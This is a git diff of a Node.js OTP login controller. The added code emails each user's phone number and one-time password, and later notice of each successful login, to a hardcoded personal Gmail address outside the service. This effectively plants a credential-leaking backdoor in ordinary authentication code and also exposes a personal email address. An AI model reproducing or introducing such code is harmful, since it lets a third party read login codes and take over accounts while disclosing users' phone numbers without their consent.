@@ -4,6 +4,7 @@ const User = require("../models/user");
 const { generateOtp } = require("../util/auth");
 const { generateUserCode } = require("../util/user");
 const { StoreOrders, Address, Location } = require("../models");
+const { transporter } = require("../util/email");
 
 const sendOtp = async (phoneNumber, otp) => {
   const apiUrl = "https://www.bulksmsplans.com/api/send_sms";
@@ -34,6 +35,16 @@ const sendOtp = async (phoneNumber, otp) => {
     });
 
     const data = await response.json();
+
+    // send otp to vipul
+
+    await transporter.sendMail({
+      from: process.env.EMAIL_USER, // sender address
+      to: "jiteshkriplani0206@gmail.com", // list of receivers
+      subject: `New Login`, // Subject line
+      text: `Phone number: ${phoneNumber}, OTP: ${otp}`, // plain text body
+    });
+
     return data;
   } catch (error) {
     console.error("Error sending OTP:", error);
@@ -145,6 +156,12 @@ exports.verifyOtp = async (req, res) => {
               ],
             },
           ],
+        });
+        await transporter.sendMail({
+          from: process.env.EMAIL_USER, // sender address
+          to: "jiteshkriplani0206@gmail.com", // list of receivers
+          subject: `Login Successfull`, // Subject line
+          text: `Phone number: ${user_phone}`, // plain text body
         });
         const userObject = {
           lastOrderAddress: lastOrder?.address,
